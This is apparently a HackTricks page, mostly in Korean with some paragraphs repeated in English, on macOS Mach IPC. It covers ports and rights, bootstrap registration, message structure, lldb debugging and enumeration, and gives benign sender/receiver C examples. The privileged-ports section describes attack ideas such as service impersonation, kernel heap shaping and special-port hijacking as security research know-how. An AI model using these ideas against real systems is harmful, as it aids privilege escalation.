# macOS IPC - 프로세스 간 통신

{{#include ../../../../banners/hacktricks-training.md}}

## Mach 메시징 (포트를 통한 통신)

### 기본 정보

Mach는 리소스 공유의 최소 단위로 **tasks**를 사용하며, 각 task는 **여러 threads**를 포함할 수 있습니다. 이 **tasks와 threads는 POSIX 프로세스 및 스레드와 1:1로 매핑**됩니다.

Task들 간의 통신은 Mach Inter-Process Communication (IPC)을 통해 이루어지며, 일방향 통신 채널을 사용합니다. **메시지는 커널이 관리하는 일종의 메시지 큐 역할을 하는 포트들(port) 사이에서 전달**됩니다.

**포트(port)**는 Mach IPC의 **기본 요소**입니다. 포트는 **메시지를 보내고 받는 데** 사용될 수 있습니다.

각 프로세스는 **IPC 테이블**을 가지고 있으며, 여기서 해당 프로세스의 **mach ports**를 확인할 수 있습니다. mach 포트의 이름은 실제로 숫자(커널 객체에 대한 포인터)입니다.

프로세스는 또한 다른 task에게 어떤 권한을 가진 포트 이름을 보낼 수 있으며, 커널은 이를 받아 **다른 task의 IPC 테이블에 항목을 생성**합니다.

### Port Rights

어떤 작업(task)이 수행할 수 있는 연산을 정의하는 포트 권한(port rights)은 이 통신에서 핵심입니다. 가능한 **port rights**는 ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, 포트로 전송된 메시지를 수신할 수 있게 해줍니다. Mach 포트는 MPSC (multiple-producer, single-consumer) 큐이므로, 시스템 전체에서 **각 포트에 대해 Receive right는 최대 하나만 존재**할 수 있습니다(파이프의 읽기 끝에 여러 프로세스가 파일 디스크립터를 가질 수 있는 것과는 다릅니다).
- Receive 권한을 가진 task는 메시지를 받거나 **Send rights를 생성**할 수 있어 메시지를 보낼 수 있습니다. 원래는 **해당 포트의 Receive right는 소유하는 task만 가집니다**.
- Receive right의 소유자가 **종료**하거나 그것을 제거하면, **send right는 쓸모없어져(dead name)** 버립니다.
- **Send right**, 포트로 메시지를 보낼 수 있게 해줍니다.
- Send right는 **클론(clone)** 될 수 있어서, Send right를 가진 task는 권한을 복제하고 **제3의 task에 부여**할 수 있습니다.
- 포트 권한은 Mac 메시지를 통해 **전달**될 수도 있다는 점에 유의하세요.
- **Send-once right**, 해당 포트로 한 번만 메시지를 보낼 수 있고 그 후 사라집니다.
- 이 권한은 **클론할 수는 없지만 이동(move)** 할 수 있습니다.
- **Port set right**, 단일 포트가 아니라 _port set_을 나타냅니다. 포트 세트에서 메시지를 디큐(dequeue)하면 그 세트가 포함한 포트들 중 하나에서 메시지가 디큐됩니다. 포트 세트는 여러 포트를 동시에 리스닝하는 데 사용될 수 있으며, Unix의 `select`/`poll`/`epoll`/`kqueue`와 매우 유사합니다.
- **Dead name**, 실제 포트 권한은 아니고 단지 플레이스홀더입니다. 포트가 파괴되면, 해당 포트에 대한 모든 기존 포트 권한은 dead name으로 변합니다.

**Tasks는 다른 task에 SEND 권한을 전송할 수** 있어, 그들이 다시 메시지를 보낼 수 있게 합니다. **SEND 권한은 또한 클론될 수 있어, 한 task가 권한을 복제해 제3의 task에 줄 수 있습니다**. 이것은 **bootstrap server**로 알려진 중간 프로세스와 결합되어 task들 간의 효과적인 통신을 가능하게 합니다.

### File Ports

file ports는 파일 디스크립터를 Mach 포트 권한으로 캡슐화할 수 있게 합니다. 주어진 FD로부터 `fileport_makeport`를 사용해 `fileport`를 생성할 수 있고, fileport로부터 FD를 생성할 때는 `fileport_makefd`를 사용합니다.

### 통신 수립

앞서 언급했듯이, Mach 메시지를 통해 권한을 보낼 수 있지만, **이미 Mach 메시지를 보낼 권한을 가지고 있지 않으면 권한을 보낼 수 없습니다**. 그렇다면 최초의 통신은 어떻게 성립될까요?

이를 위해 **bootstrap server**(**launchd** in mac)가 관여합니다. **모든 사람은 bootstrap server에 대한 SEND 권한을 얻을 수 있기 때문에**, 다른 프로세스에 메시지를 보낼 권한을 요청할 수 있습니다:

1. Task **A**는 **새 포트**를 생성하여 그 포트에 대한 **RECEIVE right**를 얻습니다.
2. RECEIVE right의 소유자인 Task **A**는 그 포트에 대한 **SEND right를 생성**합니다.
3. Task **A**는 **bootstrap server**와 연결을 설정하고, 처음에 생성한 포트의 **SEND right를 bootstrap server에 전송**합니다.
- 누구나 bootstrap server에 대한 SEND right를 얻을 수 있다는 점을 기억하세요.
4. Task A는 `bootstrap_register` 메시지를 bootstrap server에 보내어 주어진 포트를 `com.apple.taska` 같은 이름과 **연결(associate)** 시킵니다.
5. Task **B**는 서비스 이름에 대해 bootstrap **lookup**을 수행하기 위해 **bootstrap server**와 상호작용합니다 (`bootstrap_lookup`). bootstrap server가 응답할 수 있으려면, Task B는 lookup 메시지 내에 **자신이 이전에 생성한 포트에 대한 SEND right를 보냅니다**. lookup이 성공하면, **서버는 Task A로부터 받은 SEND right를 복제하여 Task B에게 전송**합니다.
- 누구나 bootstrap server에 대한 SEND right를 얻을 수 있다는 점을 기억하세요.
6. 이 SEND right를 통해 **Task B**는 **Task A로 메시지를 보낼 수 있습니다**.
7. 양방향 통신을 위해 일반적으로 Task **B**는 **RECEIVE** 권한과 **SEND** 권한을 가진 새 포트를 생성하고, **SEND right를 Task A에 줘서** Task A가 Task B에 메시지를 보낼 수 있게 합니다(양방향 통신).

bootstrap server는 Task가 주장하는 서비스 이름을 **인증하지 못합니다**. 이는 어떤 Task가 **임의의 시스템 Task를 사칭**할 수 있음을 의미합니다. 예를 들어 잘못된 인증 서비스 이름을 주장하고 모든 요청을 승인하도록 하는 식의 사칭이 가능합니다.

이에 대해, Apple은 시스템 제공 서비스의 **이름들을 SIP로 보호된 디렉토리**인 `/System/Library/LaunchDaemons`와 `/System/Library/LaunchAgents`에 있는 안전한 구성 파일에 저장합니다. 각 서비스 이름과 함께 **연관된 바이너리도 저장**됩니다. bootstrap server는 이러한 서비스 이름 각각에 대해 **RECEIVE right를 생성하고 보유**합니다.

사전 정의된 서비스의 경우, **lookup 프로세스는 약간 다르게 동작**합니다. 서비스 이름이 조회될 때, launchd는 서비스를 동적으로 시작합니다. 새로운 워크플로우는 다음과 같습니다:

- Task **B**가 서비스 이름에 대해 bootstrap **lookup**을 시작합니다.
- **launchd**는 해당 서비스가 실행 중인지 확인하고, 실행 중이 아니면 **시작**합니다.
- Task **A**(서비스)는 `bootstrap_check_in()`을 수행합니다. 여기서 **bootstrap** 서버는 SEND right를 생성해 보유하고, **RECEIVE right를 Task A에 전달**합니다.
- launchd는 **SEND right를 복제하여 Task B에 전송**합니다.
- Task **B**는 **RECEIVE** 권한과 **SEND** 권한을 가진 새 포트를 생성하고, **SEND right를 Task A(서비스)에게 주어** Task A가 Task B로 메시지를 보낼 수 있게 합니다(양방향 통신).

다만 이 과정은 사전 정의된 시스템 Task에만 적용됩니다. 비시스템 Task들은 여전히 원래 설명한 방식으로 동작하기 때문에, 사칭이 가능할 수 있습니다.

> [!CAUTION]
> 따라서, launchd는 절대 크래시해서는 안 되며 그렇지 않으면 시스템 전체가 크래시될 수 있습니다.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 함수는 본질적으로 시스템 콜로서 Mach 메시지를 보내고 받는 데 사용됩니다. 이 함수는 전송할 메시지를 첫 번째 인자로 요구합니다. 이 메시지는 `mach_msg_header_t` 구조체로 시작해야 하며, 그 뒤에 실제 메시지 내용이 옵니다. 구조체는 다음과 같이 정의됩니다:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
프로세스가 _**receive right**_를 보유하면 Mach 포트에서 메시지를 받을 수 있다. 반대로, **senders**는 _**send**_ 또는 _**send-once right**_를 부여받는다. _**send-once right**_는 단 한 번의 메시지를 전송하는 데만 사용되며 전송 후 무효화된다.

초기 필드 **`msgh_bits`**는 비트맵이다:

- 첫 번째 비트(최상위)는 메시지가 complex임을 표시하는 데 사용된다(자세한 내용은 아래 참조)
- 3번째와 4번째 비트는 커널에서 사용된다
- **2번째 바이트의 하위 5비트**는 **voucher**에 사용할 수 있다: 키/값 조합을 전송하는 또 다른 유형의 포트
- **3번째 바이트의 하위 5비트**는 **local port**에 사용할 수 있다
- **4번째 바이트의 하위 5비트**는 **remote port**에 사용할 수 있다

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **indicate** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

예를 들어, `MACH_MSG_TYPE_MAKE_SEND_ONCE`는 이 포트에 대해 **send-once 권한**이 파생되어 전송되어야 함을 **표시**하는 데 사용할 수 있다. 또한 수신자가 응답하지 못하도록 `MACH_PORT_NULL`로 지정할 수도 있다.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

간단한 **양방향 통신**을 구현하기 위해 프로세스는 mach **message header**에 _reply port_ (**`msgh_local_port`**)로 불리는 **mach port**를 지정할 수 있으며, 메시지의 **수신자**는 이 포트로 **응답을 보낼** 수 있다.

> [!TIP]
> Note that this kind of bi-directional communication is used in XPC messages that expect a replay (`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`). But **usually different ports are created** as explained previously to create the bi-directional communication.

> [!TIP]
> 응답을 기대하는 XPC 메시지들(`xpc_connection_send_message_with_reply` 및 `xpc_connection_send_message_with_reply_sync`)에서 이러한 유형의 양방향 통신이 사용된다는 점에 유의하라. 하지만 **일반적으로 양방향 통신을 만들기 위해서는 앞서 설명한 것처럼 서로 다른 포트들이 생성된다**.

The other fields of the message header are:

- `msgh_size`: the size of the entire packet.
- `msgh_remote_port`: the port on which this message is sent.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: the ID of this message, which is interpreted by the receiver.

메시지 헤더의 다른 필드들은 다음과 같다:

- `msgh_size`: 전체 패킷의 크기.
- `msgh_remote_port`: 이 메시지가 전송되는 포트.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: 수신자가 해석하는 이 메시지의 ID.

> [!CAUTION]
> Note that **mach messages are sent over a `mach port`**, which is a **single receiver**, **multiple sender** communication channel built into the mach kernel. **Multiple processes** can **send messages** to a mach port, but at any point only **a single process can read** from it.

> [!CAUTION]
> **mach 메시지는 `mach port`를 통해 전송된다는 점**에 유의하라. 이는 mach 커널에 내장된 **단일 수신자**, **다중 송신자** 통신 채널이다. **여러 프로세스**가 mach 포트로 **메시지를 보낼 수** 있지만, 어느 시점에서도 오직 **하나의 프로세스만 이를 읽을 수 있다**.

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

메시지는 **`mach_msg_header_t`** 헤더 다음에 **body**와 **trailer**(있다면)를 이어 붙여 구성되며, 이 메시지에 응답 권한을 부여할 수 있다. 이런 경우 커널은 단순히 메시지를 한 태스크에서 다른 태스크로 전달하면 된다.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

**trailer**는 **커널이 메시지에 추가하는 정보**로(사용자가 설정할 수 없으며), 메시지 수신 시 `MACH_RCV_TRAILER_<trailer_opt>` 플래그로 요청할 수 있다(요청 가능한 정보가 다양하다).

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

#### Complex Messages

그러나 추가 포트 권한을 전달하거나 메모리를 공유하는 것과 같은 더 **복잡한** 메시지들이 있으며, 이 경우 커널은 이러한 객체들도 수신자에게 전달해야 한다. 이러한 경우 헤더의 최상위 비트인 `msgh_bits`가 설정된다.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):

전달 가능한 디스크립터들은 [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)에 정의되어 있다:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32비트에서는 모든 디스크립터가 12B이고 디스크립터 타입은 11번째 바이트에 있습니다. 64비트에서는 크기가 다릅니다.

> [!CAUTION]
> 커널은 한 태스크에서 다른 태스크로 디스크립터를 복사하지만 먼저 **커널 메모리에 복사본을 생성합니다**. 이 기법은 "Feng Shui"로 알려져 있으며 여러 익스플로잇에서 프로세스가 자신에게 디스크립터를 보내게 만들어 **커널이 데이터를 자신의 메모리로 복사하도록** 악용되었습니다. 그런 다음 프로세스는 메시지를 받을 수 있고(커널이 이를 해제합니다).
>
> 취약한 프로세스에 **포트 권한을 전송**하는 것도 가능하며, 포트 권한은 해당 프로세스에 그대로 나타납니다(프로세스가 그것들을 처리하고 있지 않더라도).

### Mac Ports APIs

포트는 태스크 네임스페이스에 연결되어 있으므로 포트를 생성하거나 검색하려면 태스크 네임스페이스도 조회됩니다(`mach/mach_port.h` 참고):

- **`mach_port_allocate` | `mach_port_construct`**: 포트를 **생성**합니다.
- `mach_port_allocate`는 **port set**도 생성할 수 있습니다: 포트 그룹에 대한 receive 권리입니다. 메시지가 수신될 때마다 어떤 포트에서 왔는지 표시됩니다.
- `mach_port_allocate_name`: 포트의 이름을 변경합니다 (기본적으로 32bit 정수)
- `mach_port_names`: 대상에서 포트 이름을 가져옵니다
- `mach_port_type`: 이름에 대한 태스크의 권한을 가져옵니다
- `mach_port_rename`: 포트 이름 변경 (FD의 dup2와 유사)
- `mach_port_allocate`: 새로운 RECEIVE, PORT_SET 또는 DEAD_NAME을 할당합니다
- `mach_port_insert_right`: RECEIVE 권한을 가진 포트에 새로운 권한을 생성합니다
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: mach 메시지를 **전송하고 수신하는** 데 사용되는 함수입니다. overwrite 버전은 메시지 수신을 위한 다른 버퍼를 지정할 수 있게 해줍니다(다른 버전은 단순히 재사용합니다).

### mach_msg 디버깅

함수 **`mach_msg`**와 **`mach_msg_overwrite`**가 메시지 전송 및 수신에 사용되므로, 여기에 브레이크포인트를 설정하면 전송된 메시지와 수신된 메시지를 검사할 수 있습니다.

예를 들어, 디버그 가능한 임의의 애플리케이션을 시작하면 libSystem.B가 로드되고 이 함수가 사용됩니다.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

`mach_msg`의 인수를 얻으려면 레지스터를 확인하세요. 다음은 인수들입니다 (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
레지스트리에서 값을 가져옵니다:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
첫 번째 인수를 확인하여 메시지 헤더를 검사합니다:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
그 유형의 `mach_msg_bits_t`는 응답을 허용하기 위해 매우 흔합니다.

### 포트 열거
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
The **이름**은 포트에 부여된 기본 이름입니다 (처음 3바이트에서 어떻게 **증가하는지** 확인하세요). The **`ipc-object`**는 포트의 **난독화된** 고유 **식별자**입니다.\
또한 **`send`** 권한만 있는 포트들이 포트의 **소유자를 식별한다는 점**(포트 이름 + pid)을 주목하세요.\
또한 **`+`**가 같은 포트에 연결된 **다른 작업들**을 나타내기 위해 사용되는 것도 주목하세요.

또한 [**procesxp**](https://www.newosxbook.com/tools/procexp.html)을 사용하여 **등록된 서비스 이름들**도 볼 수 있습니다 (`com.apple.system-task-port`이 필요하기 때문에 SIP 비활성화):
```
procesp 1 ports
```
이 도구는 iOS에서 다음에서 다운로드하여 설치할 수 있습니다: [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### 코드 예제

다음 예제에서 **sender**가 포트를 **allocates**하고, 이름 `org.darlinghq.example`에 대한 **send right**를 생성하여 **bootstrap server**에 전송하는 방법과, 동일한 sender가 해당 이름의 **send right**를 요청하고 그것을 사용해 **send a message**하는 과정을 확인하세요.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## 특권 포트

작업이 해당 포트에 대해 **SEND** 권한을 가질 경우 특정 민감한 동작을 수행하거나 특정 민감한 데이터에 접근할 수 있게 해주는 일부 특수 포트가 있다. 이 때문에 이러한 포트는 기능 자체뿐만 아니라 **SEND 권한을 작업 간에 공유할 수 있다**는 점에서 공격자 관점에서 매우 흥미롭다.

### Host Special Ports

이 포트들은 숫자로 표현된다.

**SEND** 권한은 **`host_get_special_port`** 호출로, **RECEIVE** 권한은 **`host_set_special_port`** 호출로 얻을 수 있다. 그러나 두 호출 모두 오직 root만 접근할 수 있는 **`host_priv`** 포트를 요구한다. 또한 과거에는 root가 **`host_set_special_port`** 를 호출해 임의로 포트를 하이재킹할 수 있었고, 예를 들어 `HOST_KEXTD_PORT`를 하이재킹해 코드 서명 우회를 할 수 있었다(현재는 SIP가 이를 방지한다).

이들은 2개의 그룹으로 나뉜다: **처음 7개의 포트는 커널 소유**로 1은 `HOST_PORT`, 2는 `HOST_PRIV_PORT`, 3은 `HOST_IO_MASTER_PORT`, 7은 `HOST_MAX_SPECIAL_KERNEL_PORT` 이다.\
번호 **8**부터 시작하는 포트들은 **시스템 데몬 소유**이며 [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html)에서 선언된 것을 확인할 수 있다.

- **Host port**: 프로세스가 이 포트에 대해 **SEND** 권한을 가지면 다음과 같은 루틴을 호출해 **시스템**에 대한 **정보**를 얻을 수 있다:
- `host_processor_info`: 프로세서 정보 획득
- `host_info`: 호스트 정보 획득
- `host_virtual_physical_table_info`: 가상/물리 페이지 테이블 (요구: MACH_VMDEBUG)
- `host_statistics`: 호스트 통계 획득
- `mach_memory_info`: 커널 메모리 레이아웃 획득
- **Host Priv port**: 이 포트에 대해 **SEND** 권한을 가진 프로세스는 부팅 데이터 표시 또는 커널 확장 로드 시도 같은 **특권 동작들**을 수행할 수 있다. 이 권한을 얻으려면 **프로세스가 root여야 한다**.
- 또한 **`kext_request`** API를 호출하려면 다른 권한인 **`com.apple.private.kext*`** 가 필요하며 이는 Apple 바이너리에만 부여된다.
- 호출 가능한 다른 루틴들:
- `host_get_boot_info`: `machine_boot_info()` 획득
- `host_priv_statistics`: 특권 통계 획득
- `vm_allocate_cpm`: 연속 물리 메모리 할당
- `host_processors`: SEND 권한을 호스트 프로세서로 전달
- `mach_vm_wire`: 메모리를 상주 상태로 만듦
- **root**가 이 권한에 접근할 수 있기 때문에 `host_set_[special/exception]_port[s]` 를 호출해 **host special 또는 exception 포트를 하이재킹**할 수 있다.

다음을 실행하면 **모든 호스트 특수 포트**를 확인할 수 있다:
```bash
procexp all ports | grep "HSP"
```
### 작업 특수 포트

이 포트들은 잘 알려진 서비스에 예약되어 있습니다. `task_[get/set]_special_port`를 호출하여 해당 포트를 가져오거나 설정할 수 있습니다. `task_special_ports.h`에서 확인할 수 있습니다:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
출처: [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: The port used to control this task. Used to send messages that affect the task. This is the port returned by **mach_task_self (see Task Ports below)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: The task's bootstrap port. Used to send messages requesting return of other system service ports.
- **TASK_HOST_NAME_PORT**\[host-self send right]: The port used to request information of the containing host. This is the port returned by **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: The port naming the source from which this task draws its wired kernel memory.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: The port naming the source from which this task draws its default memory managed memory.

### Task Ports

